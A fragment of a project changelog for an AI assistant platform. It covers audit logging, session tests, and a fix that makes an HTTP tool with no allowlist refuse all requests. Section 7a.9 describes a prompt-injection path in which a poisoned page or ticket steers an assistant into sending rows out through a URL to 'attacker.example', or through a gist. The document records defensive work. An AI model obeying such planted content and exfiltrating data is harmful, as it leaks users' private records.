+  (about 183 days): who connected from where, to what. Credentials that
+  travel in an address are cut before a line is written: an invite
+  link's token (in the path) and a file link's signature (in the query; a
+  whole query goes). Caddy leaves out Authorization and Cookie values by
+  itself, and the config never turns that off. Checked by running the
+  real config with Caddy 2.11: the invite token, the file signature and
+  the bearer token all stay out of the file, and the client address is in
+  it.
+- **The audit log is append-only.** A Postgres trigger (migration
+  `b7a8c0d1e2f3`) refuses to delete a row or change one. The only change
+  it allows is the one the foreign keys make: blanking the user or org a
+  row names when that user or org is deleted. It is in the backups.
+- **The API's access line now names who and from where.** `user_id` is
+  noted by the sign-in dependency; `client_ip` is the address the rate
+  limiter believes. That line lives in the short container logs; the
+  half-year record is the proxy log and the audit log.
+- **OPERATIONS.md section 9** has an incident runbook: report times,
+  keeping the evidence, and ready SQL for who did what, who asked an
+  assistant, who was shown a document and who used a tool. The queries
+  were checked against Postgres. Section 8 explains VPN and NAT addresses
+  (turn off Tailscale's SNAT, or run it on the server).
+
+**Left for later:**
+
+- **The global per-address limit** (600 a minute for every request) is
+  still shared behind one address. The per-IP limits are revisited in
+  Phase 8.
+- **The API's own access lines are not kept for half a year.** For "who
+  did what", the audit log is the record; covering every 7b audit event
+  is 7b's work.
+- **Not checked in a live browser.** Port 8000 was held by another app on
+  this machine, so the dev API couldn't start. It is covered by unit tests
+  and by step 15.8.1.
+
+**Verified:**
+
+- `tests/test_session_resilience.py` (10):
+  - a retry after a lost reply keeps the session, and the lost pair is
+    retired;
+  - reuse is still caught: outside the window (30 s, token used a minute
+    ago), with the grace off, after the session moved on, and after
+    sign-out;
+  - refreshes are limited per session, not per address, and leave the
+    sign-in bucket alone;
+  - the access line names the user and the address;
+  - on Postgres, an audit row can't be changed or deleted (each with its
+    own message), while a deleted org only blanks the reference.
+- `lib/session.test.ts` (12): the three outcomes, `offline` instead of a
+  401, a refused session handing back its 401, only 401 ending a session,
+  and the backoff.
+- `test_deploy.py`: the proxy log, its retention, the filter and its
+  volume.
+- `test_auth.py`'s reuse test re-used a token at once, before the newer
+  one was used: exactly the retry the grace now accepts. It now turns the
+  grace off to keep checking strict reuse; the grace itself is tested in
+  the new file.
+- The broad API run: 1408 passed, 2 skipped (Linux-only), with that one
+  test updated afterwards. Web: 248 tests, tsc and eslint.
+- Mutation-tested: 16 of 16. Two first survived and got a test each: the
+  window itself, and the delete branch of the trigger.
+
+### 7a.9 The HTTP tool reaches only its allowed sites
+
+**The hole.** An empty allowlist meant "any public site", and a GET or HEAD
+runs without asking anyone (only requests that change something ask). So
+an IT assistant with the HTTP tool on and no list could be steered by one
+poisoned handbook page or ticket into reading rows, then sending them out
+in a URL (`https://attacker.example/?d=...`), with nobody seeing it. The
+builder's hint even said "Leave empty to allow any public site".
+
+**Now:**
+
+- **No list, no sites** (`agent/caps_http.py`). With no allowed sites (or
+  only blank entries), the tool refuses every request with "this assistant
+  isn't allowed to reach any sites yet. Its builder has to list the sites
+  it may use", and nothing leaves the server. The tool stays offered so
+  the assistant can say why it can't help, and its description tells the
+  model up front that no sites are allowed. Internal addresses stay
+  blocked even when listed.
+- **The builder hears it first** (`graph/validate.py`). The warnings panel
+  says "The HTTP request tool has no allowed sites, so every request it
+  makes will be refused", on the tool's node. The check runs even while
+  the canvas has errors, because it isn't layout guidance.
+- **Open sites are named.** A site where anyone can publish or collect
+  content still lets data out, allowlist or not: a gist, a paste, a form,
+  a request catcher, a tunnel. The panel warns about each such site on the
+  list (`OPEN_HOSTS`), including a domain that covers one (allowing
+  `google.com` allows `docs.google.com`). Every `github.com` host counts:
+  with an attacker's token in a header, taken from a poisoned page, the
+  GitHub API itself creates a gist in their account. The list is a nudge,
+  not a complete catalogue.
+- **The hint says what happens:** "Only these sites and their subdomains
+  can be reached: with none listed, every request is refused."
+- **Existing assistants:** an assistant whose HTTP tool has no list stops
+  reaching sites until its builder lists some. Its builder sees the
+  warning; the CHANGELOG says so.
+
+**Left for later:**
+
+- **The approval gate** (7b) will refuse to approve a version with this
+  tool and no list, and show the list in the review.
+- **Web search's query** is another way out (9.4).
+- **Sending the asker's identity only to allowed hosts** comes with
+  Phase 9.
+
+**Verified:**
+
+- `test_http_tool.py`:
+  - with no allowed sites, a GET to an innocent host, a GET carrying data
+    to another host and a POST all get the refusal, and nothing is sent;
+  - a list of blanks allows nothing and is said the same way;
+  - open sites are named, including covering and covered domains;
+  - an internal host stays blocked even when it is listed. That test used
+    to rely on the empty list meaning "any site", and passed for the wrong
+    reason once the empty list began to refuse.
+- Three older tests built the tool with no list and expected requests to
+  go out; they now list the site they call.
+- `test_graph_validate.py` (3): the no-sites warning (missing, empty or
+  blank list), open-site warnings, and the warning on a broken canvas.
+- Mutation-tested: 8 of 8. One survivor, a list of blanks treated as
+  sites (still sending nothing, but with a less clear message), got a
+  stricter test.
+
+### Found on the way
+
+- **The landing page section here was in two pieces.** A docs script in
+  the landing work looked up the heading "Found on the way" to know where
+  to stop, and matched the first one, in section 13. Section 14 ended up
+  half new, with a copy of section 13's ending and the old section 14
+  after it. They are merged back into one section 14.
+
